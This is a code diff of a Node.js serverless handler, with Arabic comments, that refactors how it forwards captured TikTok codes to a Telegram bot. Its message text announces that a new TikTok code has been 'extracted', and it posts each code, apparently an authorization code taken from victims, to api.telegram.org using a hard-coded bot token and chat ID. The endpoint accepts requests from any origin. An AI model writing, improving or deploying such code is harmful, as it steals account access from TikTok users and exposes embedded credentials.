@@ -3,6 +3,40 @@ const https = require('https');
 const TELEGRAM_TOKEN = '8764995786:AAH6TdLNgNP7n13JKr7M8GSFlgW3Sr87dXE';
 const TELEGRAM_CHAT_ID = '7644255708';
 
+function sendTelegramMessage(text) {
+  return new Promise((resolve) => {
+    const postData = JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: text
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      port: 443,
+      path: `/bot${TELEGRAM_TOKEN}/sendMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': Buffer.byteLength(postData)
+      }
+    };
+
+    const telegramReq = https.request(options, (telegramRes) => {
+      let body = '';
+      telegramRes.on('data', (chunk) => { body += chunk; });
+      telegramRes.on('end', () => { resolve(true); });
+    });
+
+    telegramReq.on('error', (error) => {
+      console.error('Telegram Error:', error);
+      resolve(false);
+    });
+
+    telegramReq.write(postData);
+    telegramReq.end();
+  });
+}
+
 module.exports = async (req, res) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -22,38 +56,8 @@ module.exports = async (req, res) => {
 
     if (code) {
       const messageText = `🎯 تم استخراج رمز تيك توك جديد!\n\n🔑 الـ Code هو:\n${code}\n\n⚙️ المحرك: AWR Central`;
-      
-      const postData = JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: messageText
-      });
-
-      const options = {
-        hostname: 'api.telegram.org',
-        port: 443,
-        path: `/bot${TELEGRAM_TOKEN}/sendMessage`,
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Content-Length': Buffer.byteLength(postData)
-        }
-      };
-
-      // إرسال الطلب بشكل متزامن وإجبار السيرفر على الانتظار
-      await new Promise((resolve) => {
-        const telegramReq = https.request(options, (telegramRes) => {
-          telegramRes.on('data', () => {});
-          telegramRes.on('end', () => resolve());
-        });
-
-        telegramReq.on('error', (error) => {
-          console.error('Telegram Error:', error);
-          resolve();
-        });
-
-        telegramReq.write(postData);
-        telegramReq.end();
-      });
+      // إجبار الخادم على الانتظار التام حتى تنتهي خوادم تليجرام من الاستلام
+      await sendTelegramMessage(messageText);
     }
 
     res.setHeader('Content-Type', 'application/json');
